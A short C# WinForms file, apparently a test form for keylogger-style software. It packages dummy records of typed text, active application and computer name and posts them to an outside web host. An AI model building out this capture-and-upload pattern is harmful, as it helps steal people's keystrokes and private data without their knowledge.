using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json;
using Winhex.Models;

namespace Winhex
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            List<UserAction> actions = new List<UserAction>();
            actions.Add(new UserAction() { ActionDateTime = DateTime.Now, AppTitle = "Chrome", TextLog = "heelo!" });
            actions.Add(new UserAction() { ActionDateTime = DateTime.Now, AppTitle = "Yandex", TextLog = "hih" });
            var log = new UserLog() { CompName = "New", SendingDateTime = DateTime.Now };
            log.Logs.Add(actions[0]);
            log.Logs.Add(actions[1]);

            WebSender.PostRequest(log, "http://www.ihih.somee.com/upload");
        }
    }
}
